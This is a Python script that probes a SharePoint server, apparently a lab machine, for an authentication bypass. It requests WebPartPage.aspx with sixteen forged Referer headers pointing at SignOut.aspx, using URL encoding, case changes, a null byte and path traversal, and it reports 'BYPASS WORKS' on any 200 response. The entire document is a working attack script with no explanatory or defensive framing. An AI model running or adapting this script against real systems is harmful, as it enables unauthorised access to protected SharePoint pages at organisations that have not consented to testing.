import requests

base_url = "http://10.10.10.166"
# Use known vulnerable endpoint
target = f"{base_url}/_layouts/15/WebPartPage.aspx"

referer_tests = [
    ("Trailing slash", "/_layouts/SignOut.aspx/"),
    ("URL encoded", "/%5flayouts/SignOut.aspx"),
    ("Double encoded", "/%255flayouts/SignOut.aspx"),
    ("With query string", "/_layouts/SignOut.aspx?test=1"),
    ("With fragment", "/_layouts/SignOut.aspx#test"),
    ("Absolute URL", "http://10.10.10.166/_layouts/SignOut.aspx"),
    ("Mixed case path", "/_layouts/signout.aspx"),
    ("Uppercase ASPX", "/_layouts/SignOut.ASPX"),
    ("No leading slash", "_layouts/SignOut.aspx"),
    ("Backslash separator", "\\_layouts\\SignOut.aspx"),
    ("Double slash", "/_layouts//SignOut.aspx"),
    ("With port", "http://10.10.10.166:80/_layouts/SignOut.aspx"),
    ("Different version", "/_layouts/14/SignOut.aspx"),
    ("Without version", "/_layouts/SignOut.aspx"),
    ("Null byte injection", "/_layouts/SignOut.aspx\x00"),
    ("Path traversal in referer", "/_layouts/../_layouts/SignOut.aspx"),
]

for name, referer in referer_tests:
    headers = {"User-Agent": "Mozilla/5.0", "Referer": referer}
    try:
        resp = requests.get(target, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"✓ [{name}] Status: {resp.status_code} - BYPASS WORKS")
        else:
            print(f"✗ [{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"✗ [{name}] Error: {str(e)[:50]}")
